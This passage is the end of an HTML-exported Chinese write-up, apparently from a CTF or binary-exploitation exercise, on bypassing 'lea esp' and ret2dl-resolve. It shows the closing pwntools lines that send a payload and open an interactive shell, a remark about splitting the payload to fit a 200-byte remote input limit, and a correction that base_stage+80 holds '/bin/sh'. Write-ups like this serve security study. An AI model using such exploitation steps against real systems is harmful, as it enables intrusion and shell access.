mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><img width="542"  height="115"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充9218.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是远程服务器还是不行，据说是服务器控制只能一次输入</font>200字节，导致我们这个超长的payload没有用武之地。如果要服务器上实现，需要将payload分开，每次再payload结尾调用read再次读取数据到栈中。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >0x03 纠错:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >之前写的时候没多想，第四行的注释写错了。</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Base_stage+80实际上是/bin/sh的位置，做传参之用。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="580"  height="357"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充9398.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p></div><!--EndFragment--></body></html>